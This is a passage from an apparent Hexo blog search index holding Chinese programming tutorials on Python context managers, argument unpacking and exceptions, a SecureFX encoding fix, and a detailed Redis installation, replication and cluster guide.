Manager）。什么是上下文(context)上下文在不同的地方表示不同的含义，要感性理解。context其实说白了，和文章的上下文是一个意思，在通俗一点，我觉得叫环境更好。….林冲大叫一声“啊也！”….问:这句话林冲的“啊也”表达了林冲怎样的心里？答:啊你妈个头啊！看，一篇文章，给你摘录一段，没前没后，你读不懂，因为有语境，就是语言环境存在，一段话说了什么，要通过上下文(文章的上下文)来推断。app点击一个按钮进入一个新的界面，也要保存你是在哪个屏幕跳过来的等等信息，以便你点击返回的时候能正确跳回，如果不存肯定就无法正确跳回了。看这些都是上下文的典型例子，理解成环境就可以，(而且上下文虽然叫上下文，但是程序里面一般都只有上文而已，只是叫的好听叫上下文。。进程中断在操作系统中是有上有下的，不过不这个高深的问题就不要深究了。。。)上下文管理器任何实现了 __enter__() 和 __exit__() 方法的对象都可称之为上下文管理器，上下文管理器对象可以使用 with 关键字。显然，文件（file）对象也实现了上下文管理器。那么文件对象是如何实现这两个方法的呢？我们可以模拟实现一个自己的文件类，让该类实现 __enter__() 和 __exit__() 方法。1234567891011121314class File(): def __init__(self, filename, mode): self.filename = filename self.mode = mode def __enter__(self): print("entering") self.f = open(self.filename, self.mode) return self.f def __exit__(self, *args): print("will exit") self.f.close()__enter__() 方法返回资源对象，这里就是你将要打开的那个文件对象，__exit__() 方法处理一些清除工作。因为 File 类实现了上下文管理器，现在就可以使用 with 语句了。123with File('out.txt', 'w') as f: print("writing") f.write('hello, python')这样，你就无需显示地调用 close 方法了，由系统自动去调用，哪怕中间遇到异常 close 方法也会被调用。实现上下文管理器的另外方式Python 还提供了一个 contextmanager 的装饰器，更进一步简化了上下文管理器的实现方式。通过 yield 将函数分割成两部分，yield 之前的语句在 enter 方法中执行，yield 之后的语句在 exit 方法中执行。紧跟在 yield 后面的值是函数的返回值。1234567from contextlib import contextmanager@contextmanagerdef my_open(path, mode): f = open(path, mode) yield f f.close()调用12with my_open('out.txt', 'w') as f: f.write("hello , the simplest context manager")总结Python 提供了 with 语法用于简化资源操作的后续清除操作，是 try/finally 的替代方法，实现原理建立在上下文管理器之上。此外，Python 还提供了一个 contextmanager 装饰器，更进一步简化上下管理器的实现方式。※args、※※kwargs的另外用处拆包1234567891011121314def test1(a,b,*args,**kwargs): print(a) print(b) print(args) # 以元组形式输出结果 print(kwargs) # 以字典形式输出结果test1(11,22,33,44,55,name='haha',age=34)'''输出结果1122(33, 44, 55)&#123;'name': 'haha', 'age': 34&#125;'''123456789101112131415161718192021222324252627def test2(a,b,*args,**kwargs): print(a) print(b) print(args) # 以元组形式输出结果 print(kwargs) # 以字典形式输出结果def test1(a,b,*args,**kwargs): print(a) print(b) print(args) # 以元组形式输出结果 print(kwargs) # 以字典形式输出结果 print('---' * 10) test2(a,b)test1(11,22,33,44,55,name='haha',age=34)'''1122(33, 44, 55)&#123;'name': 'haha', 'age': 34&#125;`------------------------------`1122()&#123;&#125;'''123456789101112131415161718192021222324252627282930def test2(a,b,*args,**kwargs): print(a) print(b) print(args) # 以元组形式输出结果 print(kwargs) # 以字典形式输出结果def test1(a,b,*args,**kwargs): print(a) print(b) print(args) # 以元组形式输出结果 print(kwargs) # 以字典形式输出结果 print('---' * 10) test2(a,b,args,kwargs) # 相当于test2(11,22,(33, 44, 55),&#123;'name': 'haha', 'age': 34&#125;) # 注意这样写的结果如下：((33, 44, 55), &#123;'name': 'haha', 'age': 34&#125;) # 为什么会是这样的一个结果呢？ # 是因为在函数test1中，args和kwargs已经是一个变量值了，然后传递给test2函数，被*args接收过去。test1(11,22,33,44,55,name='haha',age=34)'''1122(33, 44, 55)&#123;'name': 'haha', 'age': 34&#125;`------------------------------`1122((33, 44, 55), &#123;'name': 'haha', 'age': 34&#125;)&#123;&#125;'''1234567891011121314151617181920212223242526272829303132def test2(a,b,*args,**kwargs): print(a) print(b) print(args) # 以元组形式输出结果 print(kwargs) # 以字典形式输出结果def test1(a,b,*args,**kwargs): print(a) print(b) print(args) # 以元组形式输出结果 print(kwargs) # 以字典形式输出结果 print('---' * 10) # test2(a,b,args,kwargs) # 相当于test2(11,22,(33, 44, 55),&#123;'name': 'haha', 'age': 34&#125;) # test2(a,b,*args,kwargs) # 相当于test2(11,22,33,44,55,&#123;'name': 'haha', 'age': 34&#125;) test2(a,b,*args,**kwargs) # 注意这样的写法，相当于test2(11,22,33,44,55,name='haha',age=34) # 结果是： # (33, 44, 55) # &#123;'name': 'haha', 'age': 34&#125;test1(11,22,33,44,55,name='haha',age=34)'''1122(33, 44, 55)&#123;'name': 'haha', 'age': 34&#125;`------------------------------`1122(33, 44, 55)&#123;'name': 'haha', 'age': 34&#125;''']]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python_异常]]></title>
    <url>%2F2019%2F12%2F31%2Fpython_%E5%BC%82%E5%B8%B8%2F</url>
    <content type="text"><![CDATA[异常01. 异常的概念程序在运行时，如果 Python 解释器 遇到 到一个错误，会停止程序的执行，并且提示一些错误信息，这就是 异常程序停止执行并且提示错误信息 这个动作，我们通常称之为：抛出(raise)异常程序开发时，很难将 所有的特殊情况 都处理的面面俱到，通过 异常捕获 可以针对突发事件做集中的处理，从而保证程序的 稳定性和健壮性02. 捕获异常2.1 简单的捕获异常语法在程序开发中，如果 对某些代码的执行不能确定是否正确，可以增加 try(尝试) 来 捕获异常捕获异常最简单的语法格式：1234try: 尝试执行的代码except: 出现错误的处理try 尝试，下方编写要尝试代码，不确定是否能够正常执行的代码except 如果不是，下方编写尝试失败的代码简单异常捕获演练 —— 要求用户输入整数12345try: # 提示用户输入一个数字 num = int(input("请输入数字："))except: print("请输入正确的数字")2.2 错误类型捕获在程序执行时，可能会遇到 不同类型的异常，并且需要 针对不同类型的异常，做出不同的响应，这个时候，就需要捕获错误类型了语法如下:1234567891011try: # 尝试执行的代码 passexcept 错误类型1: # 针对错误类型1，对应的代码处理 passexcept (错误类型2, 错误类型3): # 针对错误类型2 和 3，对应的代码处理 passexcept Exception as result: print("未知错误 %s" % result)当 Python 解释器 抛出异常 时，最后一行错误信息的第一个单词，就是错误类型异常类型捕获演练 —— 要求用户输入整数需求提示用户输入一个整数使用 8 除以用户输入的整数并且输出12345678try: num = int(input("请输入整数：")) result = 8 / num print(result)except ValueError: print("请输入正确的整数")except ZeroDivisionError: print("除 0 错误")捕获未知错误在开发时，要预判到所有可能出现的错误，还是有一定难度的如果希望程序 无论出现任何错误，都不会因为 Python 解释器 抛出异常而被终止，可以再增加一个 except语法如下:12except Exception as result: print("未知错误 %s" % result)2.3 异常捕获完整语法在实际开发中，为了能够处理复杂的异常情况，完整的异常语法如下：123456789101112131415161718192021try: # 尝试执行的代码 passexcept 错误类型1: # 针对错误类型1，对应的代码处理 passexcept 错误类型2: # 针对错误类型2，对应的代码处理 passexcept (错误类型3, 错误类型4): # 针对错误类型3 和 4，对应的代码处理 passexcept Exception as result: # 打印错误信息 print(result)else: # 没有异常才会执行的代码 passfinally: # 无论是否有异常，都会执行的代码 print("无论是否有异常，都会执行的代码")else 只有在没有异常时才会执行的代码finally 无论是否有异常，都会执行的代码1234567891011121314try: num = int(input("请输入整数：")) result = 8 / num print(result)except ValueError: print("请输入正确的整数")except ZeroDivisionError: print("除 0 错误")except Exception as result: print("未知错误 %s" % result)else: print("正常执行")finally: print("执行完成，但是不保证正确")03. 异常的传递异常的传递 —— 当 函数/方法 执行 出现异常，会 将异常传递 给 函数/方法 的 调用一方如果 传递到主程序，仍然 没有异常处理，程序才会被终止提示在开发中，可以在主函数中增加 异常捕获而在主函数中调用的其他函数，只要出现异常，都会传递到主函数的 异常捕获 中这样就不需要在代码中，增加大量的 异常捕获，能够保证代码的整洁需求定义函数 demo1() 提示用户输入一个整数并且返回定义函数 demo2() 调用 demo1()在主程序中调用 demo2()12345678910111213def demo1(): return int(input("请输入一个整数："))def demo2(): return demo1()try: print(demo2())except ValueError: print("请输入正确的整数")except Exception as result: print("未知错误 %s" % result)04. 抛出 raise 异常4.1 应用场景在开发中，除了 代码执行出错 Python 解释器会 抛出 异常之外还可以根据 应用程序 特有的业务需求 主动抛出异常示例提示用户 输入密码，如果 长度少于 8，抛出 异常4.2 抛出异常Python 中提供了一个 Exception 异常类在开发时，如果满足 特定业务需求时，希望 抛出异常，可以：创建 一个 Exception 的 对象使用 raise 关键字 抛出 异常对象需求定义 input_password 函数，提示用户输入密码用户输入长度 &lt; 8，抛出异常用户输入长度 &gt;=8，返回输入的密码12345678910111213141516171819202122def input_password(): # 1. 提示用户输入密码 pwd = input("请输入密码：") # 2. 判断密码长度，如果长度 &gt;= 8，返回用户输入的密码 if len(pwd) &gt;= 8: return pwd # 3. 密码长度不够，需要抛出异常 # 1&gt; 创建异常对象 - 使用异常的错误信息字符串作为参数 ex = Exception("密码长度不够") # 2&gt; 抛出异常对象 raise extry: user_pwd = input_password() print(user_pwd)except Exception as result: print("发现错误：%s" % result)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SecureFX连接Linux后文件夹中文乱码问题解决]]></title>
    <url>%2F2019%2F12%2F31%2FSecureFX%E8%BF%9E%E6%8E%A5Linux%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[在选项中设置字符编码为UTF-8在全局选项中找到Securefx的配置文件进入到该目录中，选择“Sessions”在“Sessions”中找到当前连接linux服务器地址的ini文件，并用文本编辑器打开。 在打开的ini文件中，查找：Filenames Always Use UTF8；Filenames Always Use UTF8后面的值修改为：00000001，保存退出； 再次打开SecureFX，进入到含有中文名称的文件目录中，可以看到含有中文名称的文件已经能够正常显示了。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SecureFX</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis]]></title>
    <url>%2F2019%2F12%2F31%2FRedis%2F</url>
    <content type="text"><![CDATA[1. 简介1.1 nosql介绍NoSQL：一类新出现的数据库(not only sql)，特点如下：不支持SQL语法存储结构跟传统关系型数据库中的那种关系表完全不同，nosql中存储的数据都是KV形式NoSQL的世界中没有一种通用的语言，每种nosql数据库都有自己的api和语法，以及擅长的业务场景NoSQL中的产品种类相当多：MongodbRedisHbase hadoopCassandra hadoop1.2 NoSQL和SQL数据库的比较适用场景不同：sql数据库适合用于关系特别复杂的数据查询场景，nosql反之“事务”特性的支持：sql对事务的支持非常完善，而nosql基本不支持事务两者在不断地取长补短，呈现融合趋势1.3 Redis简介Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。Redis是 NoSQL技术阵营中的一员，它通过多种键值数据类型来适应不同场景下的存储需求，借助一些高层级的接口使用其可以胜任，如缓存、队列系统的不同角色1.4 Redis特性Redis 与其他 key - value 缓存产品有以下三个特点：Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。Redis支持数据的备份，即master-slave模式的数据备份。1.5 Redis 优势性能极高 – Redis能读的速度是110000次/s,写的速度是81000次/s 。丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。原子 – Redis的所有操作都是原子性的，同时Redis还支持对几个操作全并后的原子性执行。丰富的特性 – Redis还支持 publish/subscribe, 通知, key 过期等等特性。1.6 Redis 应用场景用来做缓存(ehcache/memcached)——redis的所有数据是放在内存中的（内存数据库）可以在某些特定应用场景下替代传统数据库——比如社交类的应用在一些大型系统中，巧妙地实现一些特定的功能：session共享、购物车只要你有丰富的想象力，redis可以用在可以给你无限的惊喜…….1.7 推荐阅读[redis官方网站] https://redis.io/[redis中文官网] http://redis.cn/2. 安装2.1 下载Redis 版本号采用标准惯例：主版本号.副版本号.补丁级别,一个副版本号就标记为一个标准发行版本，例如 1.2，2.0，2.2，2.4，2.6，2.8，奇数的副版本号用来表示非标准版本,例如2.9.x，发行版本是Redis 3.0。最新稳定版本是5.0.4，下载链接：http://download.redis.io/releases/redis-5.0.4.tar.gzsetp1：下载：wget http://download.redis.io/releases/redis-5.0.4.tar.gzsetp2：解压：tar -zxvf redis-5.0.4.tar.gzsetp3：进入到Redis目录： redis-5.0.4/step4：生成：makesetp5：测试,这段运行时间会比较长：make teststep6：安装：make installsetp7：进入到默认安装目录下查看：cd /usr/local/bin &amp;&amp; ls -alredis-server redis服务器redis-cli redis命令行客户端redis-benchmark redis性能测试工具redis-check-aof AOF文件修复工具redis-check-rdb RDB文件检索工具setp8：配置文件，移动到/etc/目录下：cp redis-5.0.4/redis.conf /etc/redis/redis其他安装方式：使用yum方式安装：yum -y install epel-release &amp;&amp; yum -y install redis (3.0.6版本)使用yum安装最新版本，如下命令安装的是最新5.0.4版本12yum install -y http://rpms.famillecollet.com/enterprise/remi-release-7.rpmyum --enablerepo=remi install redisyum安装的配置文件路径：/etc/redis.conf安装路径：ll /usr/bin/ | grep redis3. 配置yum安装的配置文件路径：/etc/redis.conf核心配置选项绑定ip：如果需要远程访问，可将此行注释，或绑定一个真实ip，默认是本机127.0.0.1bind 127.0.0.1端口：默认为6379port 6379是否以守护进程运行如果以守护进程运行，则不会在命令行阻塞，类似于服务如果以非守护进程运行，则当前终端被阻塞设置为yes表示守护进程，设置为no表示非守护进程推荐设置为yesdaemonize yes数据文件dbfilename dump.rdb数据文件存储路径dir /var/lib/redis日志文件logfile /var/log/redis/redis-server.log数据库，默认有16个database 16主从复制，类似于双机备份。slaveof4. 服务端和客户端4.1 服务器端服务器端的命令为redis-server可以使用help查看帮助文档redis-server –help推荐使用服务的方式管理redis服务systemctl start|stop|restart|status redis.service启动service redis start停止service redis stop重启service redis restart个人习惯ps -ef | grep redis 查看redis服务器进程kill -9 pid 杀死redis服务器redis-server /etc/redis/redis.conf 指定加载的配置文件4.2 客户端客户端的命令为redis-cli可以使用help查看帮助文档redis-server –help连接redisredis-cli测试123[root@localhost ~]# redis-cli 127.0.0.1:6379&gt; ping 123"123"切换数据库数据库没有名称，默认有16个，通过0-15来标识，连接redis默认选择第一个数据库select nselect n5. 数据操作5.1 数据结构redis是key-value的数据结构，每条数据都是一个键值对键的类型是字符串，且不能重复值的类型分为五种：字符串string哈希hash列表list集合set有序集合zset5.2 数据操作行为保存修改获取删除[中文官网命令文档]：http://redis.cn/commands.html5.3 String类型字符串类型是Redis中最为基础的数据存储类型，它在Redis中是二进制安全的，这便意味着该类型可以接受任何格式的数据，如JPEG图像数据或Json对象描述信息等。在Redis中字符串类型的Value最多可以容纳的数据长度是512M。保存如果设置的键不存在则为添加，如果设置的键已经存在则修改设置键值：set key value设置键值及过期时间，以秒为单位：setex key seconds value设置多个键值：mset key1 value1 key2 value2 …追加值：append key value获取获取：根据键获取值，如果不存在此键则返回nil：get key根据多个键获取多个值 ：mget key1 key2…其他常用命令查找键，参数支持正则表达式：keys pattern例如：查看所有键：keys *查看名称中含有a的键：keys &#39;a*&#39;判断键是否存在，存在返回1，不存在返回0：exists key查看键对应的value的类型：type key删除键及其对应的值：del key1 key2…….设置过期时间，以秒为单位，如果没有指定过期时间则一直存在，直到使用DEL移除：expire key seconds查看有效时间，以秒为单位：ttl key5.4 hash类型hash用于存储对象，对象的结构为属性、值值的类型为string增加、删除设置单个属性：hset key filed value例如：设置键 user的属性name为itheima：hset user name hahah错误信息：MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.Redis被配置为保存数据库快照，但它目前不能持久化到硬盘。用来修改集合数据的命令不能用原因：强制关闭Redis快照导致不能持久化。解决方案：运行config set stop-writes-on-bgsave-error no命令后，关闭配置项stop-writes-on-bgsave-error解决该问题设置多个属性：hmset key field1 value1 field2 value2 …例如： 设置键u2的属性name为haha、属性age为22：hset user name hahah age 22获取获取指定键所有的属性：hkeys key获取一个属性的值：hget key field获取多个属性的值：hmget key field1 field2 …获取所有属性的值：hvals key删除删除整个hash键及值，使用del命令删除属性，属性对应的值会被一起删除：hdel key field1 field2 …5.5 list类型列表的元素类型为string按照插入顺序排序增加在左侧插入数据：lpush key value1 value2 …在右侧插入数据：rpush key value1 value2 …在指定元素的前或后插入新元素：linsert key before或after 现有元素 新元素获取返回列表里指定范围内的元素：lrange key start stopstart、stop为元素的下标索引,引从左侧开始，第一个元素为0，索引可以是负数，表示从尾部开始计数，如-1表示最后⼀个元素设置指定索引位置的元素值：lset key index value索引从左侧开始，第一个元素为0，索引可以是负数，表示尾部开始计数，如-1表示最后一个元素删除删除指定元素：lrem key count value将列表中前count次出现的值为value的元素移除，count &gt; 0: 从头往尾移除，count &lt; 0: 从尾往头移除，count = 0: 移除所有5.6 set类型无序集合元素为string类型元素具有唯一性，不重复对于集合没有修改操作增加添加元素：sadd key member1 member2 …获取返回所有的元素：smembers key删除删除指定元素：srem key删除指定元素中的某一个值：srem key member15.7 zset类型sorted set，有序集合元素为string类型元素具有唯一性，不重复每个元素都会关联一个double类型的score，表示权重，通过权重将元素从小到大排序没有修改操作增加添加：zadd key score1 member1 score2 member2 …例如： 向键’a4’的集合中添加元素’lisi’、’wangwu’、’zhaoliu’、’zhangsan’，权重分别为4、5、6、3zadd a4 4 lisi 5 wangwu 6 zhaoliu 3 zhangsan获取返回指定范围内的元素：zrange key start stopstart、stop为元素的下标索引， 索引从左侧开始，第一个元素为0，索引可以是负数，表示从尾部开始计数，如-1表示最后一个元素返回score值在min和max之间的成员：zrangebyscore key min max返回成员member的score值：zscore key member删除删除指定元素：zrem key member1 member2 …删除权重在指定范围的元素：zremrangebyscore key min max6. 与Python交互python环境中安装redis模块：pip install redis调用模块：from redis import *这个模块中提供了StrictRedis对象(Strict严格)，用于连接redis服务器，并按照不同类型提供 了不同放法，进行交互操作6.1 StrictRedis对象方法通过init创建对象，指定参数host、port与指定的服务器和端⼝连接，host默认为localhost，port默认为6379，db默认为0sr = StrictRedis(host=&#39;localhost&#39;, port=6379, db=0)简写：sr=StrictRedis()根据不同的类型，拥有不同的实例方法可以调用，与前面学的redis命令对应，方法需要的参数与命令的参数一致。6.1.2 stringsetsetexmsetappendgetmgetkey6.1.3 keysexiststypedeleteexpiregetrangettl6.1.4 hashhsethmsethkeyshgethmgethvalshdel6.1.5 listlpushrpushlinsertlrangelsetlrem6.1.6 setsaddsmemberssrem6.1.7 zsetzaddzrangezrangebyscorezscorezremzremrangebyscore6.2 StrictRedis对象操作string类型6.2.1 准备123456789import redisif __name__ == "__main__": try: # 创建StrictRedis对象，与redis服务器建⽴连接 sr = redis.StrictRedis(host='192.168.0.138', port=6379, db=0, password=None) print('success') except Exception as e: print(e)6.2.2 string-增加方法set，添加键、值，如果添加成功则返回True，如果添加失败则返回False12345678910111213import redisif __name__ == "__main__": try: # 创建StrictRedis对象，与redis服务器建⽴连接 sr = redis.StrictRedis(host='127.0.0.1', port=6379, db=0, password='foobar2000') print('success') # 添加键name，值为haha result = sr.set('name','haha1111') # 输出响应结果，如果添加成功则返回True，否则返回False print(result) except Exception as e: print(e)6.2.3 string-获取方法get，添加键对应的值，如果键存在则返回对应的值，如果键不存在则返回None12345678910111213import redisif __name__ == "__main__": try: # 创建StrictRedis对象，与redis服务器建⽴连接 sr = redis.StrictRedis(host='127.0.0.1', port=6379, db=0, password='foobar2000') print('success') #获取键name的值 result = sr.get('name') #输出键的值，如果键不存在则返回None print(result) # b'haha1111'，类型是&lt;class 'bytes'&gt; except Exception as e: print(e)6.2.4 string-修改方法set，如果键已经存在则进行修改，如果键不存在则进行添加12345678910111213import redisif __name__ == "__main__": try: # 创建StrictRedis对象，与redis服务器建⽴连接 sr = redis.StrictRedis(host='127.0.0.1', port=6379, db=0, password='foobar2000') print('success') #获取键name的值 result = sr.set('name','hahahahhhahahh') #输出响应结果，如果操作成功则返回True，否则返回False print(result) except Exception as e: print(e)6.2.5 string-删除方法delete，删除键及对应的值，如果删除成功则返回受影响的键数，否则则返 回012345678910111213import redisif __name__ == "__main__": try: # 创建StrictRedis对象，与redis服务器建⽴连接 sr = redis.StrictRedis(host='127.0.0.1', port=6379, db=0, password='foobar2000') print('success') #获取键name的值 result = sr.delete('name') #输出响应结果，如果删除成功则返回受影响的键数，否则则返回0 print(result) except Exception as e: print(e)6.2.6 获取键方法keys，根据正则表达式获取键12345678910111213import redisif __name__ == "__main__": try: # 创建StrictRedis对象，与redis服务器建⽴连接 sr = redis.StrictRedis(host='127.0.0.1', port=6379, db=0, password='foobar2000') print('success') #获取键name的值 result = sr.keys() #输出响应结果，所有的键构成⼀个列表，如果没有键则返回空列表 print(result) except Exception as e: print(e)7. 主从配置(读写分离)一个master可以拥有多个slave，一个slave上可以拥有多个slave，如此下去，形成了强大的多级服务器集群架构master用来写数据，slave用来读数据，经统计：网站的读写比率是10:1通过主从配置可以实现读写分离master和slave都是一个redis实例(redis服务)说明：如下的实例是主从在一台服务器上，通过端口号进行区分7.1 主从配置7.1.1 配置主查看当前主机的ip地址：ifconfig修改/etc/redis.conf文件bind 192.168.26.128 # 绑定主服务器IP重启redis服务：service redis stop &amp;&amp; redis-server redis.conf7.1.2 配置从设置slave.conf文件：cp redis.conf slave.conf修改slave.conf文件bind 192.168.26.128 # 从服务器IP，因使用一台主机，所以IP同主服务器IP相同port 6378 # 从服务器端口slaveof 192.168.26.128 6379 # 关联到主信息启动redis服务：redis-server slave.conf查看主从关系：redis-cli -h 192.168.26.128 info Replication7.1.2 数据操作在master和slave分别执行info命令，查看输出信息 进入主客户端redis-cli -h 192.168.26.128 -p 6379 # 进入主客户端redis-cli -h 192.168.26.128 -p 6378 # 进入从客户端在master上写数据：set aa aa在slave上读数据：get aa8. 哨兵(主从切换)待完善……9. 搭建集群9.1 为什么要有集群一主可以多从，如果同时的访问量过大(1000w),主服务肯定就会挂掉，数据服务就挂掉了或者发生自然灾难大公司都会有很多的服务器(华东地区、华南地区、华中地区、华北地区、西北地区、西南地区、东北地区、台港澳地区机房)9.2 集群的概念集群是一组相互独立的、通过高速网络互联的计算机，它们构成了一个组，并以单一系统的模式加以管理。一个客户与集群相互作用时，集群像是一个独立的服务器。集群配置是用于提高可用性和可缩放性。当请求到来首先由负载均衡服务器处理，把请求转发到另外的一台服务器上。9.3 redis集群分类软件层面：只有一台电脑，在这一台电脑上启动了多个redis服务硬件层面：存在多台实体的电脑，每台电脑上都启动了一个redis或者多个redis服务9.4 搭建集群当前拥有两台主机172.16.179.130、172.16.179.131，这里的IP在使用时要改为实际值9.4.1 配置机器1在演示中，172.16.179.130为当前ubuntu机器的ip在172.16.179.130上进入Desktop目录，创建conf目录在conf目录下创建文件7000.conf，编辑内容如下12345678port 7000bind 172.16.179.130daemonize yespidfile 7000.pidcluster-enabled yescluster-config-file 7000_node.confcluster-node-timeout 15000appendonly yes在conf目录下创建文件7001.conf，编辑内容如下12345678port 7001bind 172.16.179.130daemonize yespidfile 7001.pidcluster-enabled yescluster-config-file 7001_node.confcluster-node-timeout 15000appendonly yes在conf目录下创建文件7001.conf，编辑内容如下12345678port 7001bind 172.16.179.130daemonize yespidfile 7001.pidcluster-enabled yescluster-config-file 7001_node.confcluster-node-timeout 15000appendonly yes在conf目录下创建文件7002.conf，编辑内容如下12345678port 7002bind 172.16.179.130daemonize yespidfile 7002.pidcluster-enabled yescluster-config-file 7002_node.confcluster-node-timeout 15000appendonly yes总结：三个文件的配置区别在port、pidfile、cluster-config-file三项使用配置文件启动redis服务123redis-server 7000.confredis-server 7001.confredis-server 7002.conf9.4.2 配置机器2在演示中，172.16.179.131为当前ubuntu机器的ip在172.16.179.131上进入Desktop目录，创建conf目录在conf目录下创建文件7003.conf，编辑内容如下12345678port 7003bind 172.16.179.131daemonize yespidfile 7003.pidcluster-enabled yescluster-config-file 7003_node.confcluster-node-timeout 15000appendonly yes在conf目录下创建文件7004.conf，编辑内容如下12345678port 7004bind 172.16.179.131daemonize yespidfile 7004.pidcluster-enabled yescluster-config-file 7004_node.confcluster-node-timeout 15000appendonly yes在conf目录下创建文件7005.conf，编辑内容如下12345678port 7005bind 172.16.179.131daemonize yespidfile 7005.pidcluster-enabled yescluster-config-file 7005_node.confcluster-node-timeout 15000appendonly yes总结：三个文件的配置区别在port、pidfile、cluster-config-file三项使用配置文件启动redis服务123redis-server 7003.confredis-server 7004.confredis-server 7005.conf9.4.3 创建集群redis的安装包中包含了redis-trib.rb，用于创建集群，接下来的操作在172.16.179.130机器上进行将命令复制，这样可以在任何目录下调用此命令cp /usr/share/doc/redis-tools/examples/redis-trib.rb /usr/local/bin/安装ruby环境，因为redis-trib.rb是用ruby开发的：apt-get install ruby运行如下命令创建集群：redis-trib.rb create --replicas 1 172.16.179.130:7000 172.16.179.130:7001 172.16.179.130:7002 172.16.179.131:7003 172.16.179.131:7004 172.16.179.131:7005执行上面这个指令在某些机器上可能会报错,主要原因是由于安装的 ruby 不是最 新版本天朝的防火墙导致无法下载最新版本,所以需要设置 gem 的源解决办法如下：– 先查看自己的 gem 源是什么地址：gem source -l – 如果是https://rubygems.org/ 就需要更换– 更换指令为：gem sources –add https://gems.ruby-china.org/ –remove https://rubygems.org/– 通过 gem 安装 redis 的相关依赖：sudo gem install redis– 然后重新执行指令9.4.4 数据验证当前搭建的主服务器为7000、7001、7003，对应的从服务器是7004、7005、7002，在172.16.179.131机器上连接7002，加参数-c表示连接到集群redis-cli -h 172.16.179.131 -c -p 7002写入数据： set name haha自动跳到了7003服务器，并写入数据成功在7003可以获取数据，如果写入数据又重定向到7000(负载均衡)9.4.5 在哪个服务器上写数据：CRC16redis cluster在设计的时候，就考虑到了去中间化，去中间件，也就是说，集群中 的每个节点都是平等的关系，都是对等的，每个节点都保存各自的数据和整个集群的状态。每个节点都和其他所有节点连接，并且这些连接保持活跃，这样就保证了我们只需要连接集群中的任意一个节点，就可以获取到其他节点的数据Redis集群没有并使用传统的一致性哈希来分配数据，而是采用另外一种叫做哈希槽 (hash slot)的方式来分配的。redis cluster 默认分配了 16384 个slot，当我们 set一个key 时，会用CRC16算法来取模得到所属的slot，然后将这个key 分到哈希槽区间的节点上，具体算法就是：CRC16(key) % 16384。所以我们在测试的 时候看到set 和 get 的时候，直接跳转到了7000端口的节点Redis 集群会把数据存在一个 master 节点，然后在这个 master 和其对应的salve 之间进行数据同步。当读取数据时，也根据一致性哈希算法到对应的 master 节 点获取数据。只有当一个master 挂掉之后，才会启动一个对应的 salve 节点，充当 master需要注意的是：必须要3个或以上的主节点，否则在创建集群时会失败，并且当存 活的主节点数小于总节点数的一半时，整个集群就无法提供服务了9.5 Python交互安装包：pip install redis-py-clusterredis-py-cluster源码地址https://github.com/Grokzen/redis-py-cluster创建文件redis_cluster.py，示例码如下1234567891011121314151617181920from rediscluster import *if __name__ == '__main__': try: # 构建所有的节点，Redis会使⽤CRC16算法，将键和值写到某个节点上 startup_nodes = [ &#123;'host': '192.168.26.128', 'port': '7000'&#125;, &#123;'host': '192.168.26.130', 'port': '7003'&#125;, &#123;'host': '192.168.26.128', 'port': '7001'&#125;, ] # 构建StrictRedisCluster对象 src=StrictRedisCluster(startup_nodes=startup_nodes,decode_responses=True) # 设置键为name、值为itheima的数据 result=src.set('name','itheima') print(result) # 获取键为name name = src.get('name') print(name) except Exception as e: print(e)]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python小知识]]></title>
    <url>%2F2019%2F12%2F31%2FPython%E5%B0%8F%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[查看 Python 中的关键字12import keywordprint(keyword.kwlist)驼峰命名法小驼峰式命名法第一个单词以小写字母开始，后续单词的首字母大写大驼峰式命名法每一个单词的首字母都采用大写字母break 和 continuebreak 和 continue 是专门在循环中使用的关键字,只针对当前所在循环有效break 某一条件满足时，退出循环，不再执行后续重复的代码continue 某一条件满足时，不执行后续重复的代码break在循环过程中，如果某一个条件满足后，不再希望循环继续执行，可以使用 break 退出循环12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-i = 0while i &lt; 10: # break 某一条件满足时，退出循环，不再执行后续重复的代码 if i == 3: break print(i) i += 1print("over")如果某一个条件满足后，不希望执行循环代码，但是又不希望退出循环，可以使用 continue12345678910111213141516#!/usr/bin/env python# -*- coding: utf-8 -*-i = 0while i &lt; 10: # 当 i == 7 时，不希望执行需要重复执行的代码 if i == 7: i += 1 continue # 重复执行的代码 print(i) i += 1print("over")使用 continue 时，条件处理部分的代码，需要特别注意，不小心会出现 死循环print函数在默认情况下， print 函数输出内容之后，会自动在内容末尾增加换行如果不希望末尾增加换行，可以在 print 函数输出内容的后面增加 , end=””其中 “” 中间可以指定 print 函数输出内容之后，继续希望显示的内容12345678#!/usr/bin/env python# -*- coding: utf-8 -*-# 向控制台输出内容结束之后，不会换行print("*", end="")# 单纯的换行print("")end=”” 表示向控制台输出内容结束之后，不会换行九九乘法表123456789101112131415161718192021#!/usr/bin/env python# -*- coding: utf-8 -*-# 定义起始行row = 1# 最大打印 9 行while row &lt;= 9: # 定义起始列 col = 1 # 最大打印 row 列 while col &lt;= row: # end = ""，表示输出结束后，不换行 # "\t" 可以在控制台输出一个制表符，协助在输出文本时对齐 print("%d * %d = %d" % (col,row,col*row),end='\t') # 列数 + 1 col += 1 # 一行打印完成的换行 print('') # 行数 + 1 row += 1\t 在控制台输出一个 